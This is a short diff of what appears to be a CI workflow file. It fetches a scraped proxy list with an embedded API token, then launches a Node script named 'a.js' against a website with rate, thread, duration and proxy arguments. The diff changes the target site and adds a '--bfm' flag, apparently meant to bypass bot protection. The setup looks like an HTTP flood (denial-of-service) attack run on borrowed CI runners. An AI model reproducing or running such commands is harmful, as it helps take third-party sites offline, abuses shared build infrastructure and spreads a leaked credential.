@@ -39,10 +39,10 @@ jobs:
           
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=A4eH8m71mK2U57785S5c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
-          screen -dms ve   node a.js GET https://catloader.com/ 1750 4 90 woo.txt --full --debug 
+          screen -dms ve   node a.js GET https://503-500.pages.dev/ 1750 4 90 woo.txt --full --debug  --bfm
 
           
-          node a.js GET https://catloader.com/ 1750 4 90 woo.txt --full --debug 
+          node a.js GET https://503-500.pages.dev/ 1750 4 90 woo.txt --full --debug --bfm
           
          
           
